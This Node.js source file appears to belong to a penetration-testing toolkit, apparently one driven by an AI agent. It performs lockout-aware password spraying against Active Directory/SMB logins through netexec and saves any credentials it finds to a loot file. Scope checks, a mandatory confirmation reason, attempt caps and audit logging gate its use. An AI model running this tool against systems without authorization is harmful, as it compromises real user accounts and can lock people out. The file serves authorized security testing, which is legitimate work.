#!/usr/bin/env node
// Cyboros spray — lockout-aware password spraying / credential stuffing. This touches REAL
// accounts, so it is CONFIRM-TIER BY CONSTRUCTION: it refuses without --confirm "<reason>" plus
// explicit in-session user approval (knowledge.md rule 2), scope-checks the target first, and
// NEVER exceeds (lockout_threshold - 1) attempts per account per window (fail-closed to 1 if the
// policy is unknown). Every attempt is audited.
//
//   node tools/spray.js run <target> --users <file> --passwords <file|--pass p> \
//        --lockout-threshold N --window <sec> --confirm "authorized: <engagement>"
//
// The credential ATTEMPT itself is injected (opts.attempt) so the schedule/guard logic is unit-
// tested offline. The default backend drives netexec via run.js for AD/SMB
// (`netexec smb <host> -u users -p pass --no-bruteforce --continue-on-success`); web login spraying
// goes through repeater.js instead. A successful pair is written to the loot vault (never stdout).
//
// ponytail: lockout policy is advisory — verify the real threshold with ad.js enum before spraying,
// and prefer 1 attempt/user/window. A single bad guess against a low threshold can lock accounts.
'use strict';
const fs = require('fs');
const path = require('path');
const sg = require('./scope-guard');
const run = require('./run');

const LOOT = () => process.env.LOOT_JSONL || path.join(__dirname, '..', 'reports', 'loot.jsonl');
const AUDIT_FILE = () => process.env.RUN_AUDIT_FILE || path.join(__dirname, '..', 'reports', 'tmp', 'run-audit.jsonl');
const SCOPE_PATH = () => process.env.SCOPE_JSON || path.join(__dirname, '..', 'scope.json');

function loadScope() { try { return sg.normalizeScope(JSON.parse(fs.readFileSync(SCOPE_PATH(), 'utf8'))); } catch { return sg.normalizeScope({}); } }
function audit(entry) { try { const p = AUDIT_FILE(); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.appendFileSync(p, JSON.stringify(Object.assign({ ts: new Date().toISOString(), tool: 'spray' }, entry)) + '\n'); } catch {} }

// ---- gate: scope + confirm + safe-attempt-count -----------------------------
function scopeCheck(target, scope) {
  scope = scope || loadScope();
  const verdict = run.isCidr(target) ? sg.cidrInScope(target, scope) : sg.inScope(target, scope);
  return { ok: !!verdict.ok, reason: verdict.reason };
}

// How many passwords may we try per account this window, given the (possibly unknown) policy?
// Fail-closed: unknown threshold -> 1. Never reach the threshold (leave a safety margin of 1).
function safeAttemptsPerWindow(lockoutThreshold) {
  const t = Number(lockoutThreshold);
  if (!Number.isFinite(t) || t <= 0) return 1;      // unknown/none -> most cautious
  return Math.max(1, t - 1);                          // never hit the lockout counter
}

// Build the (user,password) schedule respecting the per-account cap. Passwords are the outer loop
// (classic spray: one password across all users, pause, next password) but capped per account.
function buildSchedule(users, passwords, lockoutThreshold) {
  const cap = safeAttemptsPerWindow(lockoutThreshold);
  const usePasswords = passwords.slice(0, cap);
  const schedule = [];
  for (const p of usePasswords) for (const u of users) schedule.push({ user: u, password: p });
  return { schedule, cap, passwords_used: usePasswords.length, capped: passwords.length > cap };
}

// ---- orchestration ----------------------------------------------------------
async function runSpray(target, opts) {
  opts = opts || {};
  const scope = opts.scope || loadScope();

  const sc = scopeCheck(target, scope);
  if (!sc.ok) { audit({ op: 'spray', target, verdict: 'out-of-scope' }); return { ok: false, stage: 'scope', reason: sc.reason }; }

  // HARD confirm gate — spraying real accounts is never auto-tier.
  if (!opts.confirm || !String(opts.confirm).trim()) {
    audit({ op: 'spray', target, verdict: 'confirm-required' });
    return { ok: false, stage: 'confirm', reason: 'password spraying is confirm-tier: pass --confirm "<reason>" (requires explicit in-session user approval)' };
  }

  const users = opts.users || [];
  const passwords = opts.passwords || [];
  if (!users.length || !passwords.length) return { ok: false, stage: 'input', reason: 'need --users and --passwords' };

  const { schedule, cap, passwords_used, capped } = buildSchedule(users, passwords, opts.lockoutThreshold);
  audit({ op: 'spray', target, verdict: 'authorized', confirm: String(opts.confirm).slice(0, 120), users: users.length, cap, passwords_used, capped });

  const attempt = opts.attempt || defaultAttempt(target, opts);
  const pace = opts.paceMs != null ? opts.paceMs : 1500;
  const results = { attempts: 0, valid: [], capped, cap };
  for (const { user, password } of schedule) {
    const r = await attempt(user, password);
    results.attempts++;
    audit({ op: 'spray-attempt', target, user, success: !!(r && r.success) }); // password NOT logged
    if (r && r.success) {
      results.valid.push({ user });
      vaultCredential(target, user, password);
    }
    if (pace) await new Promise((res) => setTimeout(res, pace));
  }
  return { ok: true, target, attempts: results.attempts, valid_count: results.valid.length, valid: results.valid, cap, capped };
}

function vaultCredential(target, user, password) {
  try { fs.mkdirSync(path.dirname(LOOT()), { recursive: true }); fs.appendFileSync(LOOT(), JSON.stringify({ ts: new Date().toISOString(), kind: 'sprayed-credential', host: target, user, secret: password }) + '\n'); } catch {}
}

function defaultAttempt(target, opts) {
  // AD/SMB backend via netexec through run.js. Web spraying should inject a repeater-based attempt.
  return async (user, password) => {
    const res = await run.runBinary('netexec', ['smb', target, '-u', user, '-p', password, '--no-bruteforce'], { capture: true, timeoutMs: 30000 });
    const text = String((res && res.stdout) || '');
    return { success: /\[\+\]/.test(text) && !/STATUS_LOGON_FAILURE/i.test(text) };
  };
}

module.exports = { scopeCheck, safeAttemptsPerWindow, buildSchedule, runSpray, vaultCredential };

// ---- CLI --------------------------------------------------------------------
function parseCli(argv) {
  const o = { _: [] };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--users') o.usersFile = argv[++i];
    else if (a === '--passwords') o.passwordsFile = argv[++i];
    else if (a === '--pass') o.pass = argv[++i];
    else if (a === '--lockout-threshold') o.lockoutThreshold = Number(argv[++i]);
    else if (a === '--window') o.window = Number(argv[++i]);
    else if (a === '--confirm') o.confirm = argv[++i];
    else if (a === '--pace-ms') o.paceMs = Number(argv[++i]);
    else if (a.startsWith('--')) o[a.slice(2)] = argv[++i];
    else o._.push(a);
  }
  return o;
}
async function main() {
  const [cmd, target] = process.argv.slice(2);
  const o = parseCli(process.argv.slice(4));
  if (cmd !== 'run' || !target) { console.error('usage: node tools/spray.js run <target> --users <f> --passwords <f>|--pass <p> --confirm "<reason>"'); process.exit(2); }
  const lines = (f) => fs.readFileSync(f, 'utf8').split('\n').map((s) => s.trim()).filter(Boolean);
  o.users = o.usersFile ? lines(o.usersFile) : [];
  o.passwords = o.passwordsFile ? lines(o.passwordsFile) : (o.pass ? [o.pass] : []);
  const res = await runSpray(target, o);
  console.log(JSON.stringify(res, null, 2));
  process.exit(res.ok ? 0 : 1);
}
if (require.main === module) main().catch((e) => { console.error(e.message); process.exit(1); });
